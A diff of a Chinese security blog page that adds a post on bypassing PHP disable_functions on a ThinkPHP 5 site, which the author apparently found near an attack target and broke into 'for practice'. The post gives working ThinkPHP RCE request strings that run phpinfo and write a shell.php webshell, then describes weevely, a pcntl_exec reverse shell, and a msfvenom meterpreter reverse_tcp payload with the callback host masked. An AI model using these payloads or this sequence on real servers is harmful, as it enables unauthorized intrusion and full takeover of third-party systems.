@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="渗透测试,实战," />
 
 
 
@@ -88,15 +88,32 @@
 
 
 
-<meta name="description" content="渗透测试  网络安全   web">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hello_C技术博客">
-<meta property="og:url" content="http://yoursite.com/archives/2016/11/page/2/index.html">
+<meta name="description" content="一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标http://xxxxx.com/index/login/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次disable_functions绕过">
+<meta property="og:url" content="http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html">
 <meta property="og:site_name" content="Hello_C技术博客">
-<meta property="og:description" content="渗透测试  网络安全   web">
+<meta property="og:description" content="一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标http://xxxxx.com/index/login/index.html">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b5490cd9.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b548339a.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54a373a.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54bc8cb.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54da1c9.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54b061e.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54cb57e.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54b9360.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9b54c3779.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9c8872453.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9c885f867.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9c884dd12.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9c8856fab.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9c8838a03.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/09/5cac9c886f03b.png">
+<meta property="og:updated_time" content="2019-04-09T13:27:49.500Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello_C技术博客">
-<meta name="twitter:description" content="渗透测试  网络安全   web">
+<meta name="twitter:title" content="一次disable_functions绕过">
+<meta name="twitter:description" content="一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标http://xxxxx.com/index/login/index.html">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/09/5cac9b5490cd9.png">
 
 
 
@@ -126,13 +143,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2016/11/page/2/"/>
+  <link rel="canonical" href="http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html"/>
 
 
 
 
 
-  <title>归档 | Hello_C技术博客</title>
+  <title>一次disable_functions绕过 | Hello_C技术博客</title>
   
 
 
@@ -151,7 +168,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -255,188 +272,242 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hello_C">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello_C技术博客">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
-         
+          <h1 class="post-title" itemprop="name headline">一次disable_functions绕过</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T21:14:34+08:00">
+                2019-04-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        好! 目前共计 72 篇日志。 继续努力。
-      </span>
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
 
-      
-
-        
-        
-        
-
-        
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2016">2016</h1>
-          </div>
-        
-        
 
-        
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/渗透/2019/04/09/一次disable-functions绕过.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/2019/04/09/一次disable-functions绕过.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/uncategorized/2016/11/08/python之Django初探.html" itemprop="url">
-              
-                <span itemprop="name">python之Django初探</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-11-08T20:48:59+08:00"
-              content="2016-11-08" >
-          11-08
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
 
+        </div>
+      </header>
+    
 
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/uncategorized/2016/11/03/python之图像处理.html" itemprop="url">
-              
-                <span itemprop="name">python之图像处理</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-11-03T15:31:51+08:00"
-              content="2016-11-03" >
-          11-03
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/代码/2016/11/02/python之数据库编程.html" itemprop="url">
-              
-                <span itemprop="name">python数据库编程</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-11-02T20:40:21+08:00"
-              content="2016-11-02" >
-          11-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/漏洞/2016/11/02/文件上传.html" itemprop="url">
-              
-                <span itemprop="name">文件上传</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-11-02T11:41:47+08:00"
-              content="2016-11-02" >
-          11-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+      
+        <p>　　一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标<a href="http://xxxxx.com/index/login/index.html" target="_blank" rel="external">http://xxxxx.com/index/login/index.html</a><br><img src="https://i.loli.net/2019/04/09/5cac9b5490cd9.png" alt="1.png"><a id="more"></a><br><img src="https://i.loli.net/2019/04/09/5cac9b548339a.png" alt="2.png"></p>
+<p>　　直接使用EXP测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/09/5cac9b54a373a.png" alt="3.png"><br>　　写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/09/5cac9b54bc8cb.png" alt="4.png"><br><img src="https://i.loli.net/2019/04/09/5cac9b54da1c9.png" alt="5.png"><br>　　一看disable_functions，这么多被禁用了。<br><img src="https://i.loli.net/2019/04/09/5cac9b54b061e.png" alt="6.png"><br><strong>方法一：</strong><br>　　一般这样我先使用的是<strong>weevely</strong>，即使禁用一些函数，可以执行一下常见的命令，工具也比较好，这里值得推荐大家使用，网上也有好多教程，操作比较简单。<br><img src="https://i.loli.net/2019/04/09/5cac9b54cb57e.png" alt="8.png"><br><img src="https://i.loli.net/2019/04/09/5cac9b54b9360.png" alt="9.png"><br>　　可以执行一些简单的命令，但是一些跨目录什么的不能执行，换一种方法试试。</p>
+<p><strong>方法二：</strong><br>　　发现存在–enable-pcntl，可以尝试使用pcntl_exec绕过。pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求： PHP 4 &gt;= 4.2.0, PHP 5 on linux。<br><img src="https://i.loli.net/2019/04/09/5cac9b54c3779.png" alt="7.png"><br>　　这里我使用weevely远程下载pcntl_exec执行反弹shell，也可以直接上传文件，使用help或者table按键可以查看weevely的一些命令。<br><img src="https://i.loli.net/2019/04/09/5cac9c8872453.png" alt="11.png"><br>　　但是还是有一些命令不能执行。<br><img src="https://i.loli.net/2019/04/09/5cac9c885f867.png" alt="12.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c884dd12.png" alt="13.png"><br><strong>方法三：</strong><br>　　使用MSF生成elf文件，不依赖于php，可以执行命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxxx LPORT=4444 -f elf &gt; shell.elf</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/09/5cac9c8856fab.png" alt="15.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c8838a03.png" alt="16.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c886f03b.png" alt="17.png"><br>　　这一次终于绕过可以执行任意命令了。</p>
 
       
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Hello_C
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html" title="一次disable_functions绕过">http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/实战/" rel="tag"><i class="fa fa-tag"></i> 实战</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/渗透/2019/04/05/一次曲折的注入.html" rel="next" title="一次曲折的注入">
+                <i class="fa fa-chevron-left"></i> 一次曲折的注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2016/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/archives/2016/11/">1</a><span class="page-number current">2</span>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
 
 
           </div>
@@ -444,6 +515,17 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div class="ds-thread" data-thread-key="渗透/2019/04/09/一次disable-functions绕过.html"
+           data-title="一次disable_functions绕过" data-url="http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html">
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -789,6 +871,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
